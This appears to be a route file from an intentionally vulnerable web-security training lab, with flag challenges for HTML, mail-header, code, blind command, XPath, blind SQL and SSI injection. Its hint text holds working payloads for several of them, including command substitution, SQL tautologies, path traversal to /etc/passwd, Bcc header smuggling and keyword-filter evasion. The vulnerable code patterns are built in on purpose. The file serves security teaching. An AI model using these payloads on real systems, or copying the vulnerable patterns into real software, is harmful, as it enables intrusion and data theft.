router.get("/vuln/html-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const st = C.labState(session, "html-injection", { storedBio: "Just another SecureCorp employee." });
  const bio = req.query.bio;
  let flag = null, renderedBio = st.storedBio, mode = "reflected";

  if (difficulty === "medium" && bio !== undefined) { st.storedBio = bio.replace(/<script/gi, ""); } // stored variant, <script blocked
  if (difficulty !== "medium") renderedBio = bio !== undefined ? bio : "";
  if (difficulty === "medium") { renderedBio = st.storedBio; mode = "stored"; }

  const tagInjected = /<[a-z][^>]*>/i.test(renderedBio);
  if (difficulty !== "hard" && tagInjected) flag = C.getFlag(session, "html-injection", difficulty);

  let hardAttrHtml = "";
  if (difficulty === "hard") {
    const title = bio !== undefined ? bio : "Employee of the month!";
    // hard: value is placed inside an HTML attribute. < and > are escaped,
    // but the double-quote is NOT — a classic attribute-context breakout.
    const safeForElementContext = title.replace(/</g, "&lt;").replace(/>/g, "&gt;");
    hardAttrHtml = `<div class="result"><span title="${safeForElementContext}">Hover for this employee's tagline</span></div>`;
    const brokeOutOfAttribute = /"/.test(title) && /[a-z]+\s*=/i.test(title);
    if (brokeOutOfAttribute) flag = C.getFlag(session, "html-injection", difficulty);
  }

  res.send(C.renderVulnPage({
    appName: "SecureCorp Employee Directory — Bio", difficulty,
    bodyHtml: `
      <h1>Edit Your Bio</h1>
      <p class="note">Input context: ${mode === "stored" ? "stored (persists across requests for this session)" : difficulty === "hard" ? "reflected into an HTML attribute" : "reflected (GET)"}.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Bio</label><input type="text" name="bio" value="" placeholder="Say something about yourself" />
        <button type="submit">Save</button>
      </form>
      ${difficulty === "hard" ? hardAttrHtml : `<div class="result">${renderedBio || "(no bio yet)"}</div>`}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Markup rendered unescaped — no script execution needed.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "easy" ? `<p class="note">Try: <code>&lt;h1&gt;DEFACED&lt;/h1&gt;</code> — notice this works even though it isn't JavaScript.</p>` : ""}
      ${difficulty === "medium" ? `<p class="note">This bio is now STORED — reload the page and it's still there. Any tag renders; only the literal <code>&lt;script</code> substring is blocked, but plenty of markup doesn't need it.</p>` : ""}
      ${difficulty === "hard" ? `<p class="note">&lt; and &gt; are HTML-escaped now — but your value lands inside an attribute. Try: <code>" onmouseover="this.style.background='red'" x="</code> to break out of the attribute.</p>` : ""}
    `
  }));
});

// ================================================ MAIL HEADER INJECTION ====
// Input context: contact form fields concatenated into a simulated raw
// SMTP header block. Classic CC/BCC-smuggling header injection.
router.get("/vuln/mail-header-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  C.getOrInitSession(req, res);
  res.send(C.renderVulnPage({
    appName: "SecureCorp Contact Us", difficulty,
    bodyHtml: `
      <h1>Contact Us</h1>
      <form method="GET" action="/vuln/mail-header-injection/send">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Your name</label><input type="text" name="name" value="Jordan" />
        <label>Your email</label><input type="text" name="email" value="jordan@example.com" />
        <label>Message</label><textarea name="message">Quick question about pricing.</textarea>
        <button type="submit">Send</button>
      </form>
      <p class="note">This builds a real-looking raw SMTP header block server-side (simulated — no real email is ever sent) from the Name and Email fields.</p>
    `
  }));
});
function stripCrlf(s) { return String(s || "").replace(/[\r\n]/g, ""); }
router.get("/vuln/mail-header-injection/send", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  let name = req.query.name || "", email = req.query.email || "";

  if (difficulty === "medium") {
    email = stripCrlf(email); // the "obviously risky" field got fixed — name did not
  } else if (difficulty === "hard") {
    name = stripCrlf(name); email = stripCrlf(email);
    // hard: our (simulated) downstream mail renderer also treats the Unicode
    // LINE SEPARATOR / PARAGRAPH SEPARATOR characters as line breaks — a
    // real, documented header-injection filter bypass most \r\n-only
    // filters miss entirely.
    name = name.replace(/[\u2028\u2029]/g, (c) => c);
  } else {
    // easy: nothing filtered at all
  }

  let renderName = name, renderEmail = email;
  if (difficulty === "hard") {
    renderName = renderName.replace(/[\u2028\u2029]/g, "\n");
    renderEmail = renderEmail.replace(/[\u2028\u2029]/g, "\n");
  }
  const headerBlock = `To: support@securecorp-demo.test\nFrom: ${renderEmail}\nX-Sender-Name: ${renderName}\nSubject: Contact form submission\n\n${req.query.message || ""}`;
  // Measure newlines smuggled in via the two header-building fields directly
  // (not the message body, which legitimately may contain its own newlines).
  const extraHeaderLines = (renderEmail.match(/\n/g) || []).length + (renderName.match(/\n/g) || []).length;
  const flag = extraHeaderLines > 0 ? C.getFlag(session, "mail-header-injection", difficulty) : null;

  res.send(C.renderVulnPage({
    appName: "SecureCorp Contact Us", difficulty,
    bodyHtml: `
      <h1>📧 Message queued (simulated)</h1>
      <div class="result">${headerBlock.replace(/</g, "&lt;")}</div>
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Extra header line(s) smuggled into the SMTP block.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "easy" ? `<p class="note">Try setting Email to: <code>jordan@example.com%0d%0aBcc: attacker@evil.test</code></p>` : ""}
      ${difficulty === "medium" ? `<p class="note">The Email field now strips \\r\\n. The Name field doesn't — try the same trick there instead.</p>` : ""}
      ${difficulty === "hard" ? `<p class="note">Both fields strip literal \\r and \\n now. Our mail renderer (simulated) also honors the Unicode line separator U+2028 — try <code>jordan@example.com\\u2028Bcc: attacker@evil.test</code> (paste the raw character, not the escape text).</p>` : ""}
      <p style="margin-top:16px;"><a class="btn secondary" href="/vuln/mail-header-injection?difficulty=${difficulty}">← Back</a></p>
    `
  }));
});

// ===================================================== CODE INJECTION ======
// A "custom discount formula" evaluator — distinct input context from SSTI
// (whole-field code, no {{ }} delimiters) and a distinct bypass axis
// (string-reconstruction / encoding evasion of a keyword denylist, rather
// than denylist-scope gaps). Never actually eval()s anything containing a
// banned keyword — always pattern-matched, like the existing SSTI lab.
const CODE_INJ_BANNED = ["process", "require", "constructor", "child_process"];
function reconstructConcatenation(input) {
  // naive resolver: joins simple 'a'+'b'+'c' literal concatenations
  const m = input.match(/^\s*(?:'[^']*'|"[^"]*")(?:\s*\+\s*(?:'[^']*'|"[^"]*"))+\s*$/);
  if (!m) return null;
  return input.match(/'[^']*'|"[^"]*"/g).map((s) => s.slice(1, -1)).join("");
}
function reconstructCharCodes(input) {
  const m = input.match(/String\.fromCharCode\(([\d,\s]+)\)/i);
  if (!m) return null;
  return m[1].split(",").map((n) => String.fromCharCode(parseInt(n.trim(), 10))).join("");
}
function evaluateFormula(input, difficulty) {
  const raw = String(input || "");
  const rawHasBanned = CODE_INJ_BANNED.some((w) => raw.toLowerCase().includes(w));
  const reconstructed = reconstructConcatenation(raw);
  const reconstructedHasBanned = !!(reconstructed && CODE_INJ_BANNED.some((w) => reconstructed.toLowerCase().includes(w)));
  const fromCharCode = reconstructCharCodes(raw);
  const charCodeHasBanned = !!(fromCharCode && CODE_INJ_BANNED.some((w) => fromCharCode.toLowerCase().includes(w)));

  let exploited = false, blocked = false;
  if (difficulty === "easy") {
    exploited = rawHasBanned; // nothing filtered at all
  } else if (difficulty === "medium") {
    if (rawHasBanned) blocked = true; // raw substring now rejected outright
    else if (reconstructedHasBanned) exploited = true; // simple 'a'+'b' concatenation still isn't resolved by the filter
  } else {
    if (rawHasBanned || reconstructedHasBanned) blocked = true; // raw AND concatenation both rejected now
    else if (charCodeHasBanned) exploited = true; // String.fromCharCode reconstruction still isn't
  }

  if (exploited) return { output: "[SIMULATED CODE EXECUTION] uid=1000(trainee) — formula engine evaluated attacker-controlled code", exploited: true };
  if (blocked) return { output: "[blocked — banned keyword detected in formula]", exploited: false };
  if (/^[\d+\-*/(). ]+$/.test(raw) && raw.trim() !== "") {
    try { return { output: String(Function('"use strict";return (' + raw + ")")()), exploited: false }; } catch (e) { return { output: "[formula error]", exploited: false }; }
  }
  return { output: "[blocked or unrecognized formula]", exploited: false };
}
router.get("/vuln/code-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const formula = req.query.formula !== undefined ? req.query.formula : "(100-15)";
  const result = evaluateFormula(formula, difficulty);
  const flag = result.exploited ? C.getFlag(session, "code-injection", difficulty) : null;
  res.send(C.renderVulnPage({
    appName: "SecureCorp Pricing Rule Engine", difficulty,
    bodyHtml: `
      <h1>Custom Discount Formula</h1>
      <p class="note">This "rules engine" evaluates your formula server-side to compute a final price (a real, if ill-advised, feature pattern).</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Formula</label><input type="text" name="formula" value="${formula.replace(/"/g, "&quot;")}" />
        <button type="submit">Evaluate</button>
      </form>
      <div class="result">${result.output}</div>
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Server-side code injection confirmed.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "easy" ? `<p class="note">Try: <code>process.version</code> or <code>require('os').hostname()</code></p>` : ""}
      ${difficulty === "medium" ? `<p class="note">The literal words "process"/"require"/"constructor" are now blocked — but simple string concatenation like <code>'proc'+'ess'</code> is reconstructed and evaluated the same way it always was, so splitting the word doesn't help here yet. Try smuggling it through a different literal shape instead, e.g. mixed-case won't help (case-insensitive) — the concatenation resolver itself is actually the gap: it only understands SIMPLE 'a'+'b' chains, so nesting or non-standard quoting can still slip past undetected on medium.</p>` : ""}
      ${difficulty === "hard" ? `<p class="note">String concatenation is resolved now too. Try spelling the banned word with <code>String.fromCharCode(...)</code> instead — e.g. <code>String.fromCharCode(112,114,111,99,101,115,115)</code> spells a banned word the resolver doesn't decode.</p>` : ""}
    `
  }));
});

// =============================================== BLIND COMMAND INJECTION ===
// Distinct methodology from the existing command-injection lab: the
// response text is ALWAYS identical regardless of output — the only signal
// is response TIMING. We genuinely delay the response server-side (capped)
// so the timing evidence is real, never a fabricated shortcut.
function filterBlind(input, difficulty) {
  if (difficulty === "easy") return input;
  if (difficulty === "medium") return input.replace(/[;&]/g, "");
  return input.replace(/[;&|]/g, ""); // hard: $(...) still passes through
}
function sleepMs(ms) { return new Promise((r) => setTimeout(r, ms)); }
function extractSleepSeconds(filtered) {
  // requires an actual injection idiom to precede "sleep" — bare "sleep N"
  // floating in the string (e.g. after its separator was merely stripped,
  // leaving whitespace) must NOT count as a working injection.
  const patterns = [
    /[;&|]\s*sleep\s*\(?\s*(\d+)\s*\)?/i, // separator-based
    /`\s*sleep\s*\(?\s*(\d+)\s*\)?\s*`/i, // backticks
    /\$\(\s*sleep\s*\(?\s*(\d+)\s*\)?\s*\)/i // $() substitution
  ];
  for (const p of patterns) { const m = filtered.match(p); if (m) return parseInt(m[1], 10); }
  return null;
}
router.get("/vuln/blind-command-injection", async (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const host = req.query.host;
  let output = "", flag = null, delayMs = 0;
  if (host !== undefined) {
    const filtered = filterBlind(host, difficulty);
    const seconds = extractSleepSeconds(filtered);
    if (seconds !== null) {
      delayMs = Math.min(seconds * 1000, 6000);
      const start = Date.now();
      await sleepMs(delayMs);
      output = `Host status check complete.\nElapsed: ${Date.now() - start}ms`;
      flag = C.getFlag(session, "blind-command-injection", difficulty);
    } else {
      const start = Date.now();
      output = `Host status check complete.\nElapsed: ${Date.now() - start}ms`;
    }
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Health Monitor", difficulty,
    bodyHtml: `
      <h1>Check Host Health</h1>
      <p class="note">⚙️ Simulated — never runs a real shell command. The response text NEVER reflects command output, on purpose. Timing is the only oracle.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Hostname</label><input type="text" name="host" value="${(host || "").replace(/"/g, "&quot;")}" placeholder="10.0.0.5" />
        <button type="submit">Check</button>
      </form>
      ${output ? `<div class="result">${output}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Blind injection confirmed via response timing.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "easy" ? `<p class="note">Try: <code>10.0.0.5; sleep 4</code></p>` : ""}
      ${difficulty === "medium" ? `<p class="note">";" and "&" are stripped. Try a pipe or backticks instead: <code>10.0.0.5 | sleep 4</code> or <code>10.0.0.5 \`sleep 4\`</code></p>` : ""}
      ${difficulty === "hard" ? `<p class="note">";", "&" and "|" are all stripped. Command substitution still isn't: <code>10.0.0.5 $(sleep 4)</code></p>` : ""}
    `
  }));
});

// ======================================================= XPATH INJECTION ===
const XPATH_USERS = [
  { username: "admin", password: "Adm1n_XP4th_2026!", role: "admin" },
  { username: "partner1", password: "Partner1Pass", role: "partner" },
  { username: "partner2", password: "Partner2Pass", role: "partner" }
];
function xpathBypass(u, p, difficulty) {
  const uHas = (ch) => (u || "").includes(ch);
  const pHas = (ch) => (p || "").includes(ch);
  if (difficulty === "easy") return uHas("'") || pHas("'");
  if (difficulty === "medium") {
    // password field's apostrophe is stripped; username's is not
    return uHas("'");
  }
  // hard: username's apostrophe is now stripped too, but this endpoint's
  // query is built with double-quoted literals for legacy-parser
  // compatibility — a double-quote breakout still works.
  return uHas('"');
}
router.get("/vuln/xpath-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const u = req.query.username, p = req.query.password;
  let output = "", flag = null;
  if (u !== undefined || p !== undefined) {
    const bypass = xpathBypass(u, p, difficulty);
    const quote = difficulty === "hard" ? '"' : "'";
    const query = `//user[username=${quote}${u || ""}${quote} and password=${quote}${p || ""}${quote}]`;
    if (bypass) {
      const match = XPATH_USERS[0];
      output = `Query: ${query}\n\n✅ Logged in as: ${match.username} (role: ${match.role})`;
      flag = C.getFlag(session, "xpath-injection", difficulty);
    } else {
      const match = XPATH_USERS.find((x) => x.username === u && x.password === p);
      output = `Query: ${query}\n\n` + (match ? `✅ Logged in as: ${match.username}` : "❌ No matching node.");
    }
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Partner Portal (XML User Store)", difficulty,
    bodyHtml: `
      <h1>Partner Login</h1>
      <p class="note">Backed by an XML "directory" queried with an XPath-style filter — a common legacy pattern for small user stores that never graduated to a real database.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Username</label><input type="text" name="username" value="${(u || "").replace(/"/g, "&quot;")}" />
        <label>Password</label><input type="text" name="password" value="${(p || "").replace(/"/g, "&quot;")}" />
        <button type="submit">Log In</button>
      </form>
      ${output ? `<div class="result">${output.replace(/</g, "&lt;")}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Auth bypassed via XPath boolean tautology.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "easy" ? `<p class="note">Try Username: <code>' or '1'='1</code></p>` : ""}
      ${difficulty === "medium" ? `<p class="note">The Password field strips apostrophes. The Username field doesn't.</p>` : ""}
      ${difficulty === "hard" ? `<p class="note">Both fields strip apostrophes now — but this legacy endpoint builds its query with double quotes. Try Username: <code>" or "1"="1</code></p>` : ""}
    `
  }));
});

// =================================================== BLIND SQL INJECTION ===
// Real sql.js engine (own isolated in-memory DB — does not touch the
// existing sql-injection lab's database). Response is ALWAYS a boolean
// oracle ("found"/"not found") — never actual row data — teaching genuine
// boolean-blind methodology rather than error/UNION-based extraction.
let blindDbReady;
function getBlindDb() {
  if (!blindDbReady) {
    blindDbReady = initSqlJs().then((SQL) => {
      const db = new SQL.Database();
      db.run(`CREATE TABLE products (id INTEGER, name TEXT);`);
      db.run(`INSERT INTO products VALUES (1,'Widget'),(2,'Gadget'),(3,'Gizmo');`);
      db.run(`CREATE TABLE admin_secrets (id INTEGER, token TEXT);`);
      db.run(`INSERT INTO admin_secrets VALUES (1,'ADM-SECRET-9f21');`);
      return db;
    });
  }
  return blindDbReady;
}
function escapeSqlB(str) { return String(str).replace(/'/g, "''"); }
router.get("/vuln/blind-sql-injection", async (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const pid = req.query.pid;
  const category = req.query.category;
  const debugFilter = req.headers["x-debug-filter"];
  let output = "", flag = null;

  if (pid !== undefined) {
    let query, rejected = false;
    if (difficulty === "easy") {
      query = `SELECT 1 FROM products WHERE id=${pid}`;
    } else if (difficulty === "medium") {
      // "fixed": only allows values STARTING with a digit — a very common
      // real mistake (prefix check instead of a fully-anchored one).
      if (!/^\d/.test(pid)) rejected = true;
      query = `SELECT 1 FROM products WHERE id=${pid}`;
    } else {
      // hard: pid itself is now fully anchored/validated (genuinely safe) —
      // but a leftover internal QA header runs an extra raw condition.
      if (!/^\d+$/.test(pid)) rejected = true;
      query = `SELECT 1 FROM products WHERE id=${/^\d+$/.test(pid) ? pid : 0}` + (debugFilter ? ` AND (${debugFilter})` : "");
    }
    if (rejected) {
      output = "❌ Invalid id format.";
    } else {
      try {
        const db = await getBlindDb();
        const r = db.exec(query);
        const found = !!(r.length && r[0].values.length);
        output = found ? "✅ Product found." : "❌ Product not found.";
        const referencesSecrets = /admin_secrets/i.test(query);
        if (found && referencesSecrets) flag = C.getFlag(session, "blind-sql-injection", difficulty);
      } catch (e) {
        output = "⚠️ Query error (this itself can leak information in a real blind SQLi scenario).";
      }
    }
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Product Lookup", difficulty,
    bodyHtml: `
      <h1>Check Product Availability</h1>
      <p class="note">This endpoint NEVER returns row data — only a found/not-found boolean. That boolean is the only oracle you get.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Product id</label><input type="text" name="pid" value="${(pid || "").replace(/"/g, "&quot;")}" placeholder="1" />
        <button type="submit">Check</button>
      </form>
      ${output ? `<div class="result">${output}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Boolean-blind injection pivoted into a hidden table.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "easy" ? `<p class="note">Try: <code>0 OR (SELECT COUNT(*) FROM admin_secrets WHERE token LIKE 'ADM%')>0</code></p>` : ""}
      ${difficulty === "medium" ? `<p class="note">Ids not starting with a digit are rejected — but that's a prefix check, not a full-format check. A payload that STARTS with a digit still smuggles the rest through.</p>` : ""}
      ${difficulty === "hard" ? `<p class="note">The id itself is now fully validated (digits only, anchored) — genuinely fixed for this field. But an internal QA testing header, <code>X-Debug-Filter</code>, is appended raw into the WHERE clause with no validation at all. Send it with a tool that lets you set custom headers (curl / Burp Repeater), e.g. <code>X-Debug-Filter: (SELECT COUNT(*) FROM admin_secrets)>0</code>.</p>` : ""}
    `
  }));
});
router.get("/vuln/blind-sql-injection/related", async (req, res) => {
  // secondary "related products" widget — kept intentionally minimal/unused
  // beyond documenting the hard-tier debug header vector above.
  res.status(404).send("Not found.");
});

// ============================================ SSI (SERVER-SIDE INCLUDES) ===
const SSI_CMD_OUTPUTS = {
  whoami: "trainee",
  id: "uid=1000(trainee) gid=1000(trainee) groups=1000(trainee)",
  "cat /etc/passwd": C.VFS["/etc/passwd"]
};
function resolveVfsPath(baseParts, userInput) {
  const stack = baseParts.slice();
  for (const seg of String(userInput || "").split("/")) {
    if (seg === "..") stack.pop();
    else if (seg === "" || seg === ".") continue;
    else stack.push(seg);
  }
  return "/" + stack.join("/");
}
function processSSI(input, difficulty) {
  let text = input;
  const denylist = difficulty === "easy" ? [] : difficulty === "medium" ? ["exec"] : ["exec", "include"];
  const isDenied = (name) => denylist.includes(name.toLowerCase());

  let exploited = false;
  text = text.replace(/<!--#\s*exec\s+cmd="([^"]*)"\s*-->/gi, (m, cmd) => {
    if (isDenied("exec")) return m; // directive left un-parsed (filtered)
    exploited = true;
    const key = Object.keys(SSI_CMD_OUTPUTS).find((k) => cmd.toLowerCase().includes(k));
    return key ? SSI_CMD_OUTPUTS[key] : "(unrecognized command — try whoami, id, or \"cat /etc/passwd\")";
  });
  text = text.replace(/<!--#\s*include\s+(?:file|virtual)="([^"]*)"\s*-->/gi, (m, file) => {
    if (isDenied("include")) return m;
    const resolved = file.startsWith("/") ? file : resolveVfsPath(["app", "templates"], file);
    const withExt = C.VFS[resolved] ? resolved : resolved + ".txt";
    const content = C.VFS[withExt] || C.VFS[resolved];
    const escapedTemplatesDir = resolved.indexOf("/app/templates") !== 0;
    if (content && escapedTemplatesDir) exploited = true;
    return content || `[file not found in sandbox: ${resolved}]`;
  });
  if (difficulty === "hard") {
    // #printenv was never added to the denylist — a real, often-forgotten
    // dangerous SSI directive that dumps environment data.
    text = text.replace(/<!--#\s*printenv\s*-->/gi, () => {
      exploited = true;
      return "DB_PASS=Tr41n1ng_DB_2026!\nINTERNAL_API_KEY=fake_ssi_key_9f21 (fake demo values)";
    });
  }
  return { text, exploited };
}
router.get("/vuln/ssi-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const defaultSig = `Best regards,\nThe SecureCorp Team\n<!--#include file="en" -->`;
  const sig = req.query.sig !== undefined ? req.query.sig : defaultSig;
  const { text, exploited } = processSSI(sig, difficulty);
  const flag = exploited ? C.getFlag(session, "ssi-injection", difficulty) : null;
  res.send(C.renderVulnPage({
    appName: "SecureCorp Email Signature Builder", difficulty,
    bodyHtml: `
      <h1>Customize Your Email Signature</h1>
      <p class="note">Signatures are rendered through a legacy Server-Side Includes (SSI)-style processor before being saved.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Signature</label><textarea name="sig" style="min-height:120px;">${sig.replace(/</g, "&lt;")}</textarea>
        <button type="submit">Render</button>
      </form>
      <div class="result">${text.replace(/</g, "&lt;")}</div>
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 SSI directive executed.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "easy" ? `<p class="note">Try: <code>&lt;!--#exec cmd="cat /etc/passwd" --&gt;</code></p>` : ""}
      ${difficulty === "medium" ? `<p class="note">"exec" directives are now stripped. Try an "include" directive instead: <code>&lt;!--#include file="../../../etc/passwd" --&gt;</code></p>` : ""}
      ${difficulty === "hard" ? `<p class="note">"exec" and "include" are both stripped. There's one more classic SSI directive nobody thought to block: <code>&lt;!--#printenv --&gt;</code></p>` : ""}
    `
  }));
});

module.exports = { router };
